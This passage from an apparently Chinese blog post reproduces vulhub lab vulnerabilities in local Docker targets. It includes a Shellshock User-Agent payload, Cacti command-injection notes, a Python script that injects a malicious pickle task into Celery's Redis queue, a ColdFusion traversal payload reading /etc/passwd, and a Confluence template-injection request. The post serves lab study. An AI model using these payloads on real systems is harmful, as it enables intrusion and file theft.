<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/local/bash-4.3.0/bin/bash</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Content-type: text/html&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;html&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;head&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;title&gt;Bash ShellShock&lt;/title&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/head&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Hello world&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/body&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/html&gt;&#x27;</span><br><span class="hljs-built_in">exit</span> 0<br></code></pre></td></tr></table></figure>

<p>safe.cgi</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Content-type: text/html&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;html&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;head&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;title&gt;Bash ShellShock&lt;/title&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/head&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Hello world&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/body&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/html&gt;&#x27;</span><br><span class="hljs-built_in">exit</span> 0<br></code></pre></td></tr></table></figure>

<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">User-<span class="hljs-built_in">Agent</span>: () &#123; foo; &#125;; <span class="hljs-built_in">echo</span> Content-<span class="hljs-built_in">Type</span>: <span class="hljs-built_in">text</span>/plain; <span class="hljs-built_in">echo</span>; /usr/bin/id<br></code></pre></td></tr></table></figure>

<p>尝试后发现内部服务器错误</p>
<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230103205557054.png" class="" title="image-20230103205557054">

<p>读取日志文件后发现是权限问题</p>
<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230103205921329.png" class="" title="image-20230103205921329">

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x victim.cgi safe.cgi<br></code></pre></td></tr></table></figure>

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230103210129914.png" class="" title="image-20230103210129914">

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230103210152725.png" class="" title="image-20230103210152725">

<p>成功命令执行</p>
<h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><p>上述权限问题可参照<a target="_blank" rel="noopener" href="https://blog.csdn.net/Castlehe/article/details/124704393">https://blog.csdn.net/Castlehe/article/details/124704393</a> ，这下知道了Aria2无法复现可能就是权限问题</p>
<h2 id="Cacti-前台命令注入漏洞（CVE-2022-46169）"><a href="#Cacti-前台命令注入漏洞（CVE-2022-46169）" class="headerlink" title="Cacti 前台命令注入漏洞（CVE-2022-46169）"></a>Cacti 前台命令注入漏洞（CVE-2022-46169）</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf">https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A">https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A</a></li>
</ul>
<p>简而言之就是作者break 2破坏了优先性，导致可以通过X-Forwarded-For伪造内网地址通过验证，进而action&#x3D;polldata进入poll_for_data()</p>
<p>poll_for_data()函数会接收一个数组类型的local_data_ids参数和一个数字类型的参数host_id，并在poller_item表中进行查询。随后进行action的判断，如果action等于常量POLLER_ACTION_SCRIPT_PHP，即action&#x3D;2，则会执行命令。在Windows下，传入poller_id&#x3D;&amp; calc.exe即可拼接命令；在Linux下，传入poller_id&#x3D;; id即可拼接命令。</p>
<h3 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h3><p>通过vulhub起一个Cacti 1.2.22的容器复现，最新版中修改break 2为break，没有这个漏洞了</p>
<p>这个漏洞的利用需要Cacti应用中至少存在一个类似是<code>POLLER_ACTION_SCRIPT_PHP</code>的采集器。所以，我们在Cacti后台首页创建一个新的Graph：</p>
<p>admin&#x2F;admin登陆</p>
<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230103234048850.png" class="" title="image-20230103234048850">

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230103234138669.png" class="" title="image-20230103234138669">

<h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230103234451467.png" class="" title="image-20230103234451467">

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker exec -it f9 <span class="hljs-regexp">/bin/</span>bash<br>ls -al <span class="hljs-regexp">/tmp/</span><br></code></pre></td></tr></table></figure>

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230103234752107.png" class="" title="image-20230103234752107">

<p>成功执行命令，由此也可以反弹shell等操作</p>
<h2 id="Celery-lt-4-0-Redis未授权访问-Pickle反序列化利用"><a href="#Celery-lt-4-0-Redis未授权访问-Pickle反序列化利用" class="headerlink" title="Celery &lt;4.0 Redis未授权访问+Pickle反序列化利用"></a>Celery &lt;4.0 Redis未授权访问+Pickle反序列化利用</h2><p>Celery 是一个简单、灵活且可靠的分布式系统，用于处理大量消息，同时为操作提供维护此类系统所需的工具。它是一个专注于实时处理的任务队列，同时也支持任务调度。</p>
<p>在Celery &lt; 4.0版本默认使用Pickle进行任务消息的序列化传递，当所用队列服务（比如Redis、RabbitMQ、RocketMQ等等等）存在未授权访问问题时，可利用Pickle反序列化漏洞执行任意代码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> redis<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-comment"># redis连接创建</span><br>r = redis.Redis(host=sys.argv[<span class="hljs-number">1</span>], port=<span class="hljs-number">6379</span>, decode_responses=<span class="hljs-literal">True</span>,db=<span class="hljs-number">0</span>) <br><span class="hljs-comment"># celery的任务传递格式</span><br>ori_str=<span class="hljs-string">&quot;&#123;\&quot;content-type\&quot;: \&quot;application/x-python-serialize\&quot;, \&quot;properties\&quot;: &#123;\&quot;delivery_tag\&quot;: \&quot;16f3f59d-003c-4ef4-b1ea-6fa92dee529a\&quot;, \&quot;reply_to\&quot;: \&quot;9edb8565-0b59-3389-944e-a0139180a048\&quot;, \&quot;delivery_mode\&quot;: 2, \&quot;body_encoding\&quot;: \&quot;base64\&quot;, \&quot;delivery_info\&quot;: &#123;\&quot;routing_key\&quot;: \&quot;celery\&quot;, \&quot;priority\&quot;: 0, \&quot;exchange\&quot;: \&quot;celery\&quot;&#125;, \&quot;correlation_id\&quot;: \&quot;6e046b48-bca4-49a0-bfa7-a92847216999\&quot;&#125;, \&quot;headers\&quot;: &#123;&#125;, \&quot;content-encoding\&quot;: \&quot;binary\&quot;, \&quot;body\&quot;: \&quot;gAJ9cQAoWAMAAABldGFxAU5YBQAAAGNob3JkcQJOWAQAAABhcmdzcQNLZEvIhnEEWAMAAAB1dGNxBYhYBAAAAHRhc2txBlgJAAAAdGFza3MuYWRkcQdYAgAAAGlkcQhYJAAAADZlMDQ2YjQ4LWJjYTQtNDlhMC1iZmE3LWE5Mjg0NzIxNjk5OXEJWAgAAABlcnJiYWNrc3EKTlgJAAAAdGltZWxpbWl0cQtOToZxDFgGAAAAa3dhcmdzcQ19cQ5YBwAAAHRhc2tzZXRxD05YBwAAAHJldHJpZXNxEEsAWAkAAABjYWxsYmFja3NxEU5YBwAAAGV4cGlyZXNxEk51Lg==\&quot;&#125;&quot;</span><br>task_dict = json.loads(ori_str)<br>command = <span class="hljs-string">&#x27;touch /tmp/celery_success&#x27;</span><br><span class="hljs-comment"># 创建Person类，pickle反序列化时执行命令</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>    	<span class="hljs-comment"># 未导入os模块，通用</span><br>    	<span class="hljs-keyword">return</span> (<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system, (command,))<br>pickleData = pickle.dumps(Person())<br>task_dict[<span class="hljs-string">&#x27;body&#x27;</span>]=base64.b64encode(pickleData).decode()<br><span class="hljs-built_in">print</span>(task_dict)<br>r.lpush(<span class="hljs-string">&#x27;celery&#x27;</span>,json.dumps(task_dict))<br></code></pre></td></tr></table></figure>

<h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230104104448561.png" class="" title="image-20230104104448561">

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230104104505481.png" class="" title="image-20230104104505481">

<h2 id="CGI-HTTPoxy漏洞（CVE-2016-5385）"><a href="#CGI-HTTPoxy漏洞（CVE-2016-5385）" class="headerlink" title="CGI HTTPoxy漏洞（CVE-2016-5385）"></a>CGI HTTPoxy漏洞（CVE-2016-5385）</h2><h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><ul>
<li><p><a target="_blank" rel="noopener" href="https://httpoxy.org/">https://httpoxy.org/</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.laruence.com/2016/07/19/3101.html">https://www.laruence.com/2016/07/19/3101.html</a></p>
</li>
</ul>
<p><code>HTTP_PROXY</code> 环境变量会配置请求代理，而php会将网络请求Head中的请求头字段加上<code>HTTP_</code>这就导致<code>HTTP_PROXY</code>可控</p>
<h3 id="靶场-1"><a href="#靶场-1" class="headerlink" title="靶场"></a>靶场</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/vendor/autoload.php&#x27;</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">GuzzleHttp</span>\<span class="hljs-title">Client</span>;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/json; charset=utf-8&#x27;</span>);<br><br><span class="hljs-variable">$client</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Client</span>([<br>    <span class="hljs-comment">// Base URI is used with relative requests</span><br>    <span class="hljs-string">&#x27;base_uri&#x27;</span> =&gt; <span class="hljs-string">&#x27;http://httpbin.org&#x27;</span>,<br>    <span class="hljs-comment">// You can set any number of default request options.</span><br>    <span class="hljs-string">&#x27;timeout&#x27;</span>  =&gt; <span class="hljs-number">2.0</span>,<br>]);<br><br><span class="hljs-variable">$response</span> = <span class="hljs-variable">$client</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;http://httpbin.org/get&#x27;</span>);<br><br><span class="hljs-variable">$body</span> = <span class="hljs-variable">$response</span>-&gt;<span class="hljs-title function_ invoke__">getBody</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$body</span>;<br></code></pre></td></tr></table></figure>

<h3 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h3><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230105171337299.png" class="" title="image-20230105171337299">

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230105171347372.png" class="" title="image-20230105171347372">

<p>这里通过vps nc监听，并没有提供http代理服务器服务，但是可以看到这里收到了请求</p>
<h2 id="Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）"><a href="#Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）" class="headerlink" title="Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）"></a>Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</h2><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p>
<p>Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。</p>
<h3 id="复现-5"><a href="#复现-5" class="headerlink" title="复现"></a>复现</h3><p>访问<code>http://192.168.147.3:8500/CFIDE/administrator/</code>密码为admin</p>
<p>完成初始化后</p>
<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230105172729376.png" class="" title="image-20230105172729376">

<p>目录穿越，任意文件读取</p>
<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230105172840904.png" class="" title="image-20230105172840904">

<p>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/CFIDE/</span>administrator<span class="hljs-regexp">/enter.cfm?locale=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd%<span class="hljs-number">00</span>en<br></code></pre></td></tr></table></figure>

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230105173048584.png" class="" title="image-20230105173048584">

<h2 id="Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）"><a href="#Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）" class="headerlink" title="Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）"></a>Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）</h2><p>这个vulhub给出的工具出现了问题，在阅读源码后暂时无法解决，java还没学好，后续再解决</p>
<h2 id="Atlassian-Confluence-路径穿越与命令执行漏洞（CVE-2019-3396）"><a href="#Atlassian-Confluence-路径穿越与命令执行漏洞（CVE-2019-3396）" class="headerlink" title="Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）"></a>Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）</h2><p>Atlassian Confluence是企业广泛使用的wiki系统，其6.14.2版本前存在一处未授权的目录穿越漏洞，通过该漏洞，攻击者可以读取任意文件，或利用Velocity模板注入执行任意命令。</p>
<h3 id="靶场-2"><a href="#靶场-2" class="headerlink" title="靶场"></a>靶场</h3><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230106224055744.png" class="" title="image-20230106224055744">

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230106224252873.png" class="" title="image-20230106224252873">

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230106224330031.png" class="" title="image-20230106224330031">

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230106224613674.png" class="" title="image-20230106224613674">

<p>数据库账号密码均为postgres</p>
<h3 id="复现-6"><a href="#复现-6" class="headerlink" title="复现"></a>复现</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/rest/tinymce/1/macro/preview</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8090<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:8090/pages/resumedraft.action?draftId=786457&amp;draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&amp;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json; charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>170<br><br><span class="language-json"></span><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;contentId&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;786458&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;macro&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;widget&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;body&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;params&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;https://www.viddler.com/v/23464dc6&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;width&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1000&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1000&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;_template&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;../web.xml&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure>

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230106230557042.png" class="" title="image-20230106230557042">

<p><code>_template</code>可通过http远程加载模板，进而通过模板注入执行命令，另外也可以通过file协议读文件</p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2022/12/13/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3windows-linux%E5%AF%86%E7%A0%81/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>上一页</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
              2023-01-06 23:45:44
            </span>
            
          </div>
          <div class="post-foot-prev">
            
              <a href="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" target="_self">
                <span>下一页</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">目录</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulhub%E5%A4%8D%E7%8E%B0"><span class="toc-text">vulhub复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#activemq"><span class="toc-text">activemq</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2015-5254"><span class="toc-text">CVE-2015-5254</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ActiveMQ%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">ActiveMQ是什么？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-text">复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B1%80%E9%99%90%E6%80%A7"><span class="toc-text">局限性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89"><span class="toc-text">ActiveMQ任意文件写入漏洞（CVE-2016-3088）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell"><span class="toc-text">写入webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5crontab%EF%BC%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E5%BC%B9shell"><span class="toc-text">写入crontab，自动化弹shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#airflow"><span class="toc-text">airflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-11978"><span class="toc-text">CVE-2020-11978</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-11981"><span class="toc-text">CVE-2020-11981</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-17526"><span class="toc-text">CVE-2020-17526</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">Apereo CAS 4.1 反序列化命令执行漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apisix"><span class="toc-text">apisix</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-APISIX-%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13945%EF%BC%89"><span class="toc-text">Apache APISIX 默认密钥漏洞（CVE-2020-13945）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#appweb"><span class="toc-text">appweb</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2018-8715"><span class="toc-text">CVE-2018-8715</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0-1"><span class="toc-text">复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Aria2-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">Aria2 任意文件写入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash-Shellshock-%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89"><span class="toc-text">Bash Shellshock 破壳漏洞（CVE-2014-6271）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA"><span class="toc-text">靶场</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3"><span class="toc-text">问题解决</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cacti-%E5%89%8D%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-46169%EF%BC%89"><span class="toc-text">Cacti 前台命令注入漏洞（CVE-2022-46169）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA"><span class="toc-text">靶场搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0-2"><span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Celery-lt-4-0-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-text">Celery &lt;4.0 Redis未授权访问+Pickle反序列化利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0-3"><span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CGI-HTTPoxy%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-5385%EF%BC%89"><span class="toc-text">CGI HTTPoxy漏洞（CVE-2016-5385）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA-1"><span class="toc-text">靶场</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 